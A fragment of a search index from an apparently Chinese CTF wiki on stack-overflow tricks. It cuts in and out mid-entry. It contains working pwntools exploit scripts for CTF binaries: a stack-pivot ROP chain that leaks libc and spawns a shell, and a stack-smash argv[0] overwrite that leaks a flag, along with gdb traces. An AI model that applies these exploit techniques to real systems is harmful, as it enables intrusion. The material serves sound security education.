)","title":"getshell"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#exp","text":"system('/bin/sh') from pwn import * context . log_level = 'debug' p = process ( \"./over.over\" ) elf = ELF ( \"./over.over\" ) libc = elf . libc pop_rdi = 0x400793 leave_ret = 0x4006be puts_plt = elf . plt [ 'puts' ] puts_got = elf . got [ 'puts' ] sub_addr = 0x400676 # leak ebp p . sendafter ( \">\" , 'A' * 0x50 ) stack = u64 ( p . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 log . info ( \"stack:\" + hex ( stack )) # leak libc payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( puts_got ) + p64 ( puts_plt ) payload += p64 ( sub_addr ) # ret2text payload = payload . ljust ( 0x50 , 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret ) p . sendafter ( \">\" , payload ) libc_base = u64 ( p . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] log . success ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] log . success ( \"system_addr:\" + hex ( system_addr )) binsh_addr = libc_base + libc . search ( '/bin/sh' ) . next () log . success ( \"binsh_addr:\" + hex ( binsh_addr )) # system('/bin/sh') payload = p64 ( 0xdeadbeef ) + p64 ( pop_rdi ) + p64 ( binsh_addr ) + p64 ( system_addr ) payload += p64 ( sub_addr ) # ret2text payload = payload . ljust ( 0x50 , 'a' ) # padding payload += p64 ( stack ) payload += p64 ( leave_ret ) gdb . attach ( p ) p . sendafter ( \">\" , payload ) p . interactive () execve(\"/bin/sh\", 0, 0) from pwn import * context . binary = \"./over.over\" def DEBUG ( cmd ): raw_input ( \"DEBUG: \" ) gdb . attach ( io , cmd ) io = process ( \"./over.over\" ) elf = ELF ( \"./over.over\" ) libc = elf . libc io . sendafter ( \">\" , 'a' * 80 ) stack = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 success ( \"stack -> {:#x} \" . format ( stack )) # DEBUG(\"b *0x4006B9\\nc\") io . sendafter ( \">\" , flat ([ '11111111' , 0x400793 , elf . got [ 'puts' ], elf . plt [ 'puts' ], 0x400676 , ( 80 - 40 ) * '1' , stack , 0x4006be ])) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] success ( \"libc.address -> {:#x} \" . format ( libc . address )) pop_rdi_ret = 0x400793 ''' $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \"pop|ret\" 0x00000000000f5279 : pop rdx ; pop rsi ; ret ''' pop_rdx_pop_rsi_ret = libc . address + 0xf5279 payload = flat ([ '22222222' , pop_rdi_ret , next ( libc . search ( \"/bin/sh\" )), pop_rdx_pop_rsi_ret , p64 ( 0 ), p64 ( 0 ), libc . sym [ 'execve' ], ( 80 - 7 * 8 ) * '2' , stack - 0x30 , 0x4006be ]) io . sendafter ( \">\" , payload ) io . interactive ()","title":"exp"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#stack-smash","text":"","title":"Stack smash"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_12","text":"\u5728\u7a0b\u5e8f\u52a0\u4e86 canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5f53 canary \u503c\u53d8\u5316\u540e\uff0c\u7a0b\u5e8f\u4f1a\u9519\u8bef\u9000\u51fa\u5e76\u63d0\u793a\u9519\u8bef\u4fe1\u606f\uff0c\u901a\u5e38\u662f\u8bf4 xxx\uff08\u7a0b\u5e8f\u540d\uff09 \u6bb5\u9519\u8bef\u3002 stack smash \u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u542f\u52a8 canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0 canary \u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c __stack_chk_fail \u51fd\u6570\u6765\u6253\u5370 argv[0] \u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b void __attribute__ ((noreturn)) __stack_chk_fail (void) { __fortify_fail (\"stack smashing detected\"); } void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) { /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"<unknown>\"); } \u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6 argv[0] \u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728 __fortify_fail \u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002","title":"\u539f\u7406"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#32c3-ctf-readme","text":"\u8be5\u9898\u76ee\u5728 jarvisoj \u4e0a\u6709\u590d\u73b0\u3002","title":"32C3 CTF readme"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_13","text":"\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a 64 \u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4ee5\u53ca NX \u4fdd\u62a4\uff0c\u4ee5\u53ca FORTIFY \u4fdd\u62a4\u3002 Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_14","text":"ida \u770b\u4e00\u4e0b __int64 sub_4007E0() { __int64 v0; // rax@1 __int64 v1; // rbx@2 int v2; // eax@3 __int64 v4; // [sp+0h] [bp-128h]@1 __int64 v5; // [sp+108h] [bp-20h]@1 v5 = *MK_FP(__FS__, 40LL); __printf_chk(1LL, (__int64)\"Hello!\\nWhat's your name? \"); LODWORD(v0) = _IO_gets((__int64)&v4); if ( !v0 ) LABEL_9: _exit(1); v1 = 0LL; __printf_chk(1LL, (__int64)\"Nice to meet you, %s.\\nPlease overwrite the flag: \"); while ( 1 ) { v2 = _IO_getc(stdin); if ( v2 == -1 ) goto LABEL_9; if ( v2 == '\\n' ) break; byte_600D20[v1++] = v2; if ( v1 == ' ' ) goto LABEL_8; } memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1)); LABEL_8: puts(\"Thank you, bye!\"); return *MK_FP(__FS__, 40LL) ^ v5; } _IO_gets((__int64)&v4) \u5b58\u5728\u6808\u6ea2\u51fa\u3002 \u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981 overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728 while \u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5 memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1)); \u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684 flag \u5c31\u5728\u8fd9\u91cc\u3002 .data:0000000000600D20 ; char aPctfHereSTheFl[] .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0 \u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9 byte_600D20[v1++] = v2; \u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86 \u5728 ELF \u5185\u5b58\u6620\u5c04\u65f6\uff0cbss \u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa \uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u7684 find \u6765\u8fdb\u884c\u67e5\u627e\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#flag","text":"\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7d memset \u51fd\u6570\uff080x400873\uff09\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b pwndbg> b *0x400873 Breakpoint 1 at 0x400873 pwndbg> r Starting program: /home/skye/readme.bin Hello! What 's your name? aaaaaaaa Nice to meet you, aaaaaaaa. Please overwrite the flag: bbbbbbbb Breakpoint 1, 0x0000000000400873 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0xa RBX 0x8 RCX 0x7ffff7b04260 (__read_nocancel+7) \u25c2\u2014 cmp rax, -0xfff RDX 0x18 # flag \u5b58\u653e\u5730\u5740 RDI 0x600d28 \u25c2\u2014 ' ServerHasTheFlagHere... ' RSI 0x0 R8 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 R9 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 R10 0x814 R11 0x246 R12 0x4006ee \u25c2\u2014 xor ebp, ebp R13 0x7fffffffdd70 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x4008b0 \u25c2\u2014 push r15 RSP 0x7fffffffdb60 \u25c2\u2014 ' aaaaaaaa ' RIP 0x400873 \u25c2\u2014 call 0x400670 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x400873 call memset@plt <0x400670> # flag \u5b58\u653e\u5730\u5740 s: 0x600d28 \u25c2\u2014 ' ServerHasTheFlagHere... ' c: 0x0 n: 0x18 0x400878 mov edi, 0x40094e 0x40087d call puts@plt <0x400640> 0x400882 mov rax, qword ptr [rsp + 0x108] 0x40088a xor rax, qword ptr fs:[0x28] 0x400893 jne 0x4008a9 0x400895 add rsp, 0x118 0x40089c pop rbx 0x40089d pop rbp 0x40089e ret 0x40089f mov edi, 1 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 # name \u5b58\u653e\u5730\u5740 00:0000\u2502 rsp 0x7fffffffdb60 \u25c2\u2014 ' aaaaaaaa ' 01 :0008\u2502 0x7fffffffdb68 \u2014\u25b8 0x7ffff7ffd900 ( _rtld_global+2240 ) \u25c2\u2014 0x0 02 :0010\u2502 0x7fffffffdb70 \u2014\u25b8 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 03 :0018\u2502 0x7fffffffdb78 \u25c2\u2014 0x0 04 :0020\u2502 0x7fffffffdb80 \u2014\u25b8 0x7ffff7ffea88 \u2014\u25b8 0x7ffff7ffe9b8 \u2014\u25b8 0x7ffff7ffe728 \u2014\u25b8 0x7ffff7ffe700 \u25c2\u2014 ... 05 :0028\u2502 0x7fffffffdb88 \u2014\u25b8 0x7fffffffdbc0 \u25c2\u2014 0x2 06 :0030\u2502 0x7fffffffdb90 \u25c2\u2014 0x380 07 :0038\u2502 0x7fffffffdb98 \u2014\u25b8 0x7fffffffdbb0 \u25c2\u2014 0xffffffff \u4ece 18 \u884c\u6216 33 \u884c\u53ef\u4ee5\u5f97\u51fa flag \u5b58\u653e\u5730\u5740\u4e3a\uff1a0x600d28 \u3002\u53e6\u5916\u4e00\u4e2a bss \u6bb5\u5185\u7684 flag \u5730\u5740\u4f7f\u7528 peda find \u529f\u80fd\u67e5\u627e\uff0c\u4e24\u4e2a flag \u5730\u5740\u5206\u522b\u4e3a\uff1a 0x600d28 \u30010x400d28\u3002 \u8fd9\u91cc\u9700\u8981\u51cf\u53bb\u504f\u79fb\uff08\u88ab name \u8986\u76d6\u4e86 0x7 \uff09\u624d\u80fd\u5f97\u5230\u5b8c\u6574 flag \uff0c\u6240\u4ee5\u4e24\u4e2a flag \u5730\u5740\u4e3a\uff1a0x600d21 \u30010x400d21 gdb-peda$ find Serv Searching for 'Serv' in : None ranges Found 6 results, display max 6 items: readme.bin : 0x400d28 ( \"ServerHasTheFlagHere...\" ) readme.bin : 0x600d28 ( \"ServerHasTheFlagHere...\" ) libc : 0x7ffff7b97641 ( \"Servname not supported for ai_socktype\" ) libc : 0x7ffff7b9924c ( \"Server rejected credential\" ) libc : 0x7ffff7b9927f ( \"Server rejected verifier\" ) libc : 0x7ffff7b994af ( \"Server can't decode arguments\" )","title":"\u786e\u5b9a flag \u5730\u5740"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_15","text":"\u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9a argv[0] \u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002 \u9996\u5148\u4e0b\u65ad\u70b9\u5728 main \u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b gef\u27a4 b *0x00000000004006D0 Breakpoint 1 at 0x4006d0 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes Breakpoint 1 , 0x00000000004006d0 in ?? () code:i386:x86-64 ] \u2500\u2500\u2500\u2500 0x4006c0 <_IO_gets@plt+0> jmp QWORD PTR [ rip+0x20062a ] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 <_IO_gets@plt+6> push 0x9 0x4006cb <_IO_gets@plt+11> jmp 0x400620 \u2192 0x4006d0 sub rsp, 0x8 0x4006d4 mov rdi, QWORD PTR [ rip+0x200665 ] # 0x600d40 <stdout> 0x4006db xor esi, esi 0x4006dd call 0x400660 <setbuf@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0x7fffffffdb78' , 'l8' ] 8 0x00007fffffffdb78\u2502+0x00: 0x00007ffff7a2d830 \u2192 <__libc_start_main+240> mov edi, eax \u2190 $rsp 0x00007fffffffdb80\u2502+0x08: 0x0000000000000000 0x00007fffffffdb88\u2502+0x10: 0x00007fffffffdc58 \u2192 0x00007fffffffe00b \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]\" 0x00007fffffffdb90\u2502+0x18: 0x0000000100000000 0x00007fffffffdb98\u2502+0x20: 0x00000000004006d0 \u2192 sub rsp, 0x8 0x00007fffffffdba0\u2502+0x28: 0x0000000000000000 0x00007fffffffdba8\u2502+0x30: 0x48c916d3cf726fe3 0x00007fffffffdbb0\u2502+0x38: 0x00000000004006ee \u2192 xor ebp, ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x4006d0 \u2192 sub rsp, 0x8 [ #1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) ---Type < return > to continue , or q < return > to quit--- [ #2] 0x400717 \u2192 hlt \u53ef\u4ee5\u770b\u51fa 0x00007fffffffe00b \u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662f argv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f6 0x00007fffffffdc58 \u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u662f 0x00007fffffffdc58 \u7684\u503c\u3002 argv[0] \u8bfb\u5165\u65b9\u5f0f\u770b 16 \u884c\uff0c\u7cfb\u7edf\u5230 0x00007fffffffdc58 \u627e\u5230\u5730\u5740\uff0c\u7136\u540e\u53d6\u5730\u5740\u7684\u503c\u3002 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7fffffffdda8 \u2014\u25b8 0x400d21 \u25c2\u2014 xor al, byte ptr [ rbx + 0x33 ] /* '2C3_TheServerHasTheFlagHere...' */ RBX 0x1 RCX 0x0 RDX 0x7ffff7b9c481 \u25c2\u2014 jae 0x7ffff7b9c4f7 /* 'stack smashing detected' */ RDI 0x1 RSI 0x7ffff7b9c49f \u25c2\u2014 sub ch, byte ptr [ rdx ] /* '*** %s ***: %s terminated\\n' */ \u2026\u2026 RBP 0x7ffff7b9c481 \u25c2\u2014 jae 0x7ffff7b9c4f7 /* 'stack smashing detected' */ RSP 0x7fffffffdb60 \u25c2\u2014 0x4 RIP 0x7ffff7b2614b ( __fortify_fail+75 ) \u25c2\u2014 mov rcx, qword ptr [ rax ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2026\u2026 0x7ffff7b26146 <__fortify_fail+70> mov rdx, rbp 0x7ffff7b26149 <__fortify_fail+73> mov edi, ebx \u25ba 0x7ffff7b2614b <__fortify_fail+75> mov rcx, qword ptr [ rax ] \u2026\u2026 \u5269\u4e0b\u5c31\u662f\u627e\u5230\u6ea2\u51fa\u70b9\u5199\u5165\u5b57\u7b26\u4e32\u7684\u6808\u5730\u5740\uff0c\u5728 \u786e\u5b9a flag \u5730\u5740 \u4e2d\u7684\u7b2c\u4e00\u4e2a\u8c03\u8bd5\u4e2d\u7684 53 \u884c\u627e\u5230 name \u5b58\u653e\u5730\u5740\uff1a0x7fffffffdb60","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_16","text":"from pwn import * context . log_level = 'debug' p = process ( \"./readme.bin\" ) flag1 = 0x600d21 flag2 = 0x400d21 argv0 = 0x7fffffffdd78 name = 0x7fffffffdb60 #0x7fffffffdca8 payload = 'a' * ( argv0 - name ) payload += p64 ( flag2 ) p . recvuntil ( \"name? \" ) gdb . attach ( p ) p . sendline ( payload ) p . recvuntil ( \"flag: \" ) p . sendline ( \"skye\" ) data = p . recv () p . interactive ()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#partial-overwrite","text":"partial overwrite \u8fd9\u79cd\u6280\u5de7\u5728\u5f88\u591a\u5730\u65b9\u90fd\u9002\u7528, \u8fd9\u91cc\u5148\u4ee5\u6808\u4e0a\u7684 partial overwrite \u4e3a\u4f8b\u6765\u4ecb\u7ecd\u8fd9\u79cd\u601d\u60f3\u3002 \u6211\u4eec\u77e5\u9053, \u5728\u5f00\u542f\u4e86\u968f\u673a\u5316\uff08ASLR\uff0cPIE\uff09\u540e, \u65e0\u8bba\u9ad8\u4f4d\u7684\u5730\u5740\u5982\u4f55\u53d8\u5316\uff0c\u4f4e 12 \u4f4d\u7684\u9875\u5185\u504f\u79fb\u59cb\u7ec8\u662f\u56fa\u5b9a\u7684, \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u80fd\u66f4\u6539\u4f4e\u4f4d\u7684\u504f\u79fb, \u5c31\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41, \u7ed5\u8fc7 PIE \u4fdd\u62a4\u3002 \u66f4\u5168\u9762\u7684 PIE \u4fdd\u62a4\u7ed5\u8fc7\u770b\u841d\u535c\u5e08\u5085\u7684\uff1a PIE\u4fdd\u62a4\u8be6\u89e3\u548c\u5e38\u7528bypass\u624b\u6bb5","title":"\u6808\u4e0a\u7684 partial overwrite"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#2018-babypie","text":"\u4ee5\u5b89\u6052\u676f 2018 \u5e74 7 \u6708\u6708\u8d5b\u7684 babypie \u4e3a\u4f8b\u5206\u6790\u8fd9\u4e00\u79cd\u5229\u7528\u6280\u5de7, \u9898\u76ee\u7684 binary \u653e\u5728\u4e86 ctf-challenge \u4e2d","title":"2018 - \u5b89\u6052\u676f - babypie"},{"location":"Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/#_17","text":"Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE 